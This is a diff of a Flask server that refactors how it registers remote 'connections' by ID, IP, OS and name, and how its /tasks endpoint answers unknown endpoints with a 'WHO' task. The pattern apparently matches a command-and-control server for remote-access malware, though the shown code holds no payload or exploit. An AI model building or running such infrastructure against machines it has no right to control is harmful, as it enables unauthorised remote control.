@@ -255,6 +255,15 @@ def log(message):
     log_queue.put(message)
 
     
+    
+def add_user(id,ip,os,name):
+    new_user = Connections(id,ip,os,name)
+    users.append(new_user)
+    log(f"\n[+] New connection from {request.remote_addr}")
+    log(f"INFO:\n-> ID : {new_user.id}\n-> IP : {new_user.ip}\n-> OS : {new_user.os}\n-> NAME : {new_user.name}\n")
+    get_user(id).time_last_seen = time.time()
+        
+    
 @app.route("/info", methods=["POST"])
 def get_info():
     data = request.get_json()
@@ -266,29 +275,27 @@ def get_info():
     except ValueError as e:
         log("[-] Fetching connection error: {e}")  
     if get_user(id) == False: 
-        new_user = Connections(id,request.remote_addr,os,name)
-        users.append(new_user)
-        log(f"\n[+] New connection from {request.remote_addr}")
-        log(f"INFO:\n-> ID : {new_user.id}\n-> IP : {new_user.ip}\n-> OS : {new_user.os}\n-> NAME : {new_user.name}\n")
-        get_user(id).time_last_seen = time.time()
+        add_user(id,request.remote_addr,os,name)
     else:
         log(f"[+] {get_user(id).ip} connected")
         get_user(id).time_last_seen = time.time()
     return "OK"
+
+
 
 @app.route("/tasks", methods=["POST"])
 def task_check():
     data = request.get_json()
 
     if not data:
-        return jsonify({"error": "JSON required"}), 400
+        return jsonify({"error": "JSON"}), 400
 
     id = data.get("id")
     endpoint = get_user(id)
 
     if endpoint == False:
-        log("[-] Aborted: Unknown Endpoint")
-        return jsonify({"error": "unknown endpoint"}), 404
+        log("[*] Verifying connection")
+        return jsonify({"task": "WHO"}), 400
 
     endpoint.time_last_seen = time.time()
     endpoint.status = "online"
